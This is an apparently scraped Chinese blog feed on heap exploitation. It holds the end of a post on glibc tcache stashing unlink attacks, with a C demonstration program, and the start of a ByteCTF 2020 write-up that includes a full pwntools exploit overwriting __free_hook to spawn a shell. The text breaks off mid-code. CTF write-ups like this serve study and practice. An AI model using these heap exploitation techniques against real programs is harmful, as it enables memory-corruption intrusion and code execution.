class="hljs-number">0x555555558050</span></code></pre></div><p>很明显最终目标也就是保证让<code>tc_victim</code>放入tcache即可。观察代码，可以发现仅需要保证的也就是不要让程序crush。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//得保证目标地址chunk的bk为可写的指针</span>  bck = tc_victim-&gt;bk; <span class="hljs-comment">//tag-0x10-&gt;bk=bck =tag+8 </span>  set_inuse_bit_at_offset (tc_victim, nb);  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (tc_victim);  bin-&gt;bk = bck;  bck-&gt;fd = bin; <span class="hljs-comment">//保证一个可写的bck，程序即可正常的执行</span>  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>  tcache_put (tc_victim, tc_idx);</code></pre></div><p>其得保证<code>tc_victim-&gt;bk</code>是一个可写指针，此示例程序是<code>&amp;victim</code>，是其他的也是可以的。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555558050</span><span class="hljs-number">0x555555558050</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555558060</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558060</span><span class="hljs-number">0x555555558070</span> &lt;victim+<span class="hljs-number">16</span>&gt;:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p bck$<span class="hljs-number">22</span> = (mchunkptr) <span class="hljs-number">0x555555558060</span> &lt;victim&gt;</code></pre></div><p>执行完毕后，获得一个目标地址的chunk进入了tcache，也达到了阈值，也就退出了 stash 循环。<br>并且再次申请一下就得到一个目标地址的chunk。</p><div class="hljs"><pre><code class="hljs undefined">(<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x60</span>)   tcache_entry[4](7): 0x555555558060 --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559de0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559440</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555593e0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559380</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559320</span> --&gt;</span> <span class="hljs-number">0</span>x5555555592c0</code></pre></div><h4 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h4><ul><li>先放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache</li><li>在不破坏 fd 的情况下，<strong>将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；</strong></li><li>接着用calloc触发stash 机制，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin-&gt;bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 smallbins 中。</li><li>之后不满足终止条件，会进行下一次的 stash，这时的 <code>tc_victim</code> 就是目标地址。接下来由于原来的设置，目标地址加 0x8 处的指针是一个可写指针，保证stash流程正常走完。</li><li>最后目标地址就会被放入 <code>tcache_entry</code>的头部，stash 满足终止条件而终止。</li></ul><p>重点在攻击最后一个进入smallbin的bk指针，让其指向目标地址-0x10的地方，并且<strong>保证目标地址+8的位置为一个可写的指针。</strong></p><h3 id="tcache-stashing-unlink-plus-plus"><a href="#tcache-stashing-unlink-plus-plus" class="headerlink" title="tcache_stashing_unlink plus plus"></a><code>tcache_stashing_unlink plus plus</code></h3><p>也就是可以同时实现上面的2个功能。</p><ul><li>任意地址分配一个chunk</li><li>任意地址写入一个<code>main_arena</code>附近的值</li></ul><h4 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim2 = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<span class="hljs-keyword">char</span> *t1;<span class="hljs-keyword">char</span> *s1, *s2, *pad;<span class="hljs-keyword">char</span> *tmp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n"</span>);tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, &amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim2's address: %p, victim2's value: 0x%lx\n"</span>,&amp;victim2, victim2);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. change victim's data, make victim[1] = &amp;victim2-0x10\n"</span>);victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim2)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. choose a stable size and free five identical size chunks to tcache_entry list\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, &amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Apply to tcache_entry[4], you can get a pointer to victim address\n"</span>);<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim2's value: 0x%lx\n"</span>,victim2);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h4 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h4><p>基本跟第2个一样，断点还是断在相似的位置，然后分析相关位置的代码即可。</p><p>调试完成发现，其跟第二个十分相似，只是在第二个中保证的是：<code>目标地址+8</code>为一个可写的地址即可。然而想要实现一个地方写入一个巨大的<code>main_arena</code>附近的值，只需把<code>目标地址+8</code>为这个地方-0x10即可。</p><div class="hljs"><pre><code class="hljs c">bck-&gt;fd = bin;</code></pre></div><h4 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h4><p>重点操作在：</p><ul><li>将 Smallbins 里的后一个进入的chunk的 bk 设置为目标地址 1 减 0x10</li><li>将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。</li></ul><p>这样就可以分配到目标地址 1的chunk，同时向目标地址 2 写入一个大数字。</p><h3 id="相关例题-1"><a href="#相关例题-1" class="headerlink" title="相关例题"></a>相关例题</h3><ul><li><code>2019-HITCON-one_punch_man</code></li><li><code>2019-HITCON-lazyhouse</code></li><li><code>2020-XCTF-GXZY-twochunk</code></li><li><code>BUU 新春红包3</code></li></ul><p>其中均为libc2.29下的题目，但是基本不影响对漏洞利用的学习。</p><h2 id="参加链接"><a href="#参加链接" class="headerlink" title="参加链接"></a>参加链接</h2><p><a href="https://zhuanlan.zhihu.com/p/136983333" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/136983333</a></p><p><a href="http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89" target="_blank" rel="noopener">http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;glibc-2-29引入stash-机制后引起的相关漏洞学习&quot;&gt;&lt;a href=&quot;#glibc-2-29引入stash-机制后引起的相关漏洞学习&quot; class=&quot;headerlink&quot; title=&quot;glibc 2.29引入stash 机制后引起的相关漏洞学习&quot;&gt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Bytectf2020部分wp</title>
    <link href="http://chumen77.xyz/2020/10/27/Bytectf2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/27/Bytectf2020部分wp/</id>
    <published>2020-10-27T03:33:31.939Z</published>
    <updated>2020-11-27T09:35:31.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bytectf2020部分wp"><a href="#Bytectf2020部分wp" class="headerlink" title="Bytectf2020部分wp"></a>Bytectf2020部分wp</h1><h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是漏洞点比较隐蔽。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2mcWzH.png" srcset="/img/loading.gif" alt><br>此处第一次申请chunk时的size，作为后面一个偏移来写0。如果故意第一次时输入不是<code>0～0x80</code>的范围，其就可以实现任意地址写0。其中这个v2也可以是负数。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>leak libc</li><li>在tcache chain上写个0，用tcache attcak打free hook</li><li>free 一个带有<code>/bin/sh\x00</code>的chunk</li></ul><h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><h5 id="libc-malloc中tcache-get函数"><a href="#libc-malloc中tcache-get函数" class="headerlink" title="__libc_malloc中tcache_get函数"></a><code>__libc_malloc</code>中<code>tcache_get</code>函数</h5><h6 id="在libc-2-31中"><a href="#在libc-2-31中" class="headerlink" title="在libc 2.31中"></a>在<code>libc 2.31</code>中</h6><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)  &#123;    <span class="hljs-keyword">return</span> tcache_get (tc_idx);  &#125;</code></pre></div><p>这里看到其中调用<code>tcache_get</code>的第三个条件是<code>tcache-&gt;counts[tc_idx] &gt; 0</code> </p><h6 id="在libc-2-30以下"><a href="#在libc-2-30以下" class="headerlink" title="在libc 2.30以下"></a>在<code>libc 2.30</code>以下</h6><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-meta">if</span> (tc_idx &lt; mp_.tcache_bins    <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span>    <span class="hljs-variable">&amp;&amp;</span> tcache    <span class="hljs-variable">&amp;&amp;</span> tcache-&gt;entries[tc_idx] != <span class="hljs-meta">NULL</span>)  &#123;    <span class="hljs-meta">return</span> tcache_get (tc_idx);  &#125;</code></pre></div><p>这里看到其中调用<code>tcache_get</code>的第三个条件是<code>tcache-&gt;entries[tc_idx] != NULL</code></p><h5 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h5><p>这样就使得当初的一个攻击套路失效了。 </p><p><img src="http://qiqianyun.chumen77.xyz/uPic/j0fmUh.png" srcset="/img/loading.gif" alt><br>比如开始0x50的<code>tcache-&gt;counts[tc_idx] = 1</code>，倘若攻击了chunk1的fd，使其指向目标地址。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/LO0Kwl.png" srcset="/img/loading.gif" alt><br>在申请完chunk1后，<code>tcache-&gt;counts[tc_idx] = 0</code>，此时就过不去了libc2.31的检查，就无法调用<code>tcache_get</code>获取tag chunk。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./easyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:io = process(local_file)libc = elf.libc<span class="hljs-keyword">else</span>:io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)libc = elf.libc<span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'ize'</span>,str(size))sla(<span class="hljs-string">'ent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):free(<span class="hljs-number">7</span>-i)sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x100</span>))sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x8</span>))sla(<span class="hljs-string">'ent'</span>,str(<span class="hljs-string">'1'</span>*<span class="hljs-number">7</span> + <span class="hljs-string">'2'</span> +<span class="hljs-string">'\n'</span>))show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'2'</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1ebc60</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0x1eeb28</span>+libcbase))add(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0x1eeb28</span>+libcbase))free(<span class="hljs-number">4</span>)free(<span class="hljs-number">7</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">3</span>)sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x121</span>))sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x80</span>))sla(<span class="hljs-string">'ent'</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, <span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, <span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0x55410</span>+libcbase))free(<span class="hljs-number">6</span>)itr()</code></pre></div><h2 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="buy函数"><a href="#buy函数" class="headerlink" title="buy函数"></a>buy函数</h4><ul><li>申请的 chunk 大小 <code>0xf - 0x500</code></li><li>申请的chunk 在bss的表现为：1个name的buf，1个next chunk，1个此chunk 的flag位</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Bullet</span>&#123;</span><span class="hljs-keyword">char</span>* name;    Bullet* next;    <span class="hljs-keyword">int</span> flag;&#125;;<span class="hljs-keyword">sizeof</span>(Bullet) = <span class="hljs-number">0x18</span></code></pre></div><h4 id="load函数"><a href="#load函数" class="headerlink" title="load函数"></a>load函数</h4><ul><li>检查chunk的flag位，若为0或者2，退出不接着执行。</li><li>若待操作位<code>0x04060</code>处已经存在数值，其就在该chunk 的next 处，填上此数值</li><li>操作位<code>0x04060</code> 写入该chunk在bss的位置，并设置flag为2，其在多次调用后，会形成一个链表</li></ul><h4 id="shoot函数"><a href="#shoot函数" class="headerlink" title="shoot函数"></a>shoot函数</h4><ul><li>先检查 操作位<code>0x04060</code>处是否为空</li><li>读入发射的子弹数，并存在一个buf中，留着做比较</li><li>判断操作位<code>0x04060</code>处不为空，且i 小于子弹数，开始一个循环： 打印name，释放chunk，操作位<code>0x04060</code> 写入该chunk的next 指针，设置flag为0，i++</li></ul><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>并未对chunk的next 指针进行清0，在多次申请并load后，其就会存在数据。倘若先释放一个chunk后，其free的机制会用这个next指针数据的残余，可能还会释放一次刚刚释放过的chunk</p><h3 id="攻击细节要点"><a href="#攻击细节要点" class="headerlink" title="攻击细节要点"></a>攻击细节要点</h3><p>由于程序的libc为2.31，其对tcache进行了double free的检测，绕过的办法可以是更改下其bk处的key值。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//倘若key值改为其他值，即bypass</span>     &#123;       tcache_entry *tmp;       LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);       <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)         <span class="hljs-keyword">if</span> (tmp == e)           malloc_printerr(<span class="hljs-string">"free(): double free detected in tcache 2"</span>);     &#125;</code></pre></div><p>但是此题无法修改到这个key，因此采用使用fastbin attack。如何从转移到fastbin attack，主要使用到tcache的stash机制。（单纯进行fastbin attack的话也是可以的，跟往常的fastbin attack是一样的，但是用了tcache的stash机制会更加方便，并且也是很容易实现和触发的）</p><h4 id="tcache的stash机制"><a href="#tcache的stash机制" class="headerlink" title="tcache的stash机制"></a>tcache的stash机制</h4><p>这里分析一下对于fastbin的stash机制</p><div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())) <span class="hljs-comment">//size在fastbin范围内</span>  &#123;    idx = fastbin_index(nb);    mfastbinptr *fb = &amp;fastbin(av, idx);    mchunkptr pp;    victim = *fb;     <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//如果有chunk</span>    &#123;      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span>      <span class="hljs-keyword">else</span>        REMOVE_FB(fb, pp, victim);       <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>))       &#123;        <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));        <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>)) <span class="hljs-comment">//对fastbin的size检查</span>          malloc_printerr(<span class="hljs-string">"malloc(): memory corruption (fast)"</span>);        check_remalloced_chunk(av, victim, nb);  <span class="hljs-comment">//if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中</span>        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>        <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span>        &#123;          mchunkptr tc_victim;           <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span>          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//只要tcache没满，并且fastbin还有chunk</span>          &#123;            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//从fastbin中取出</span>              *fb = tc_victim-&gt;fd;            <span class="hljs-keyword">else</span>            &#123;              REMOVE_FB(fb, pp, tc_victim);              <span class="hljs-keyword">if</span> (__glibc_unlikely(tc_victim == <span class="hljs-literal">NULL</span>))                <span 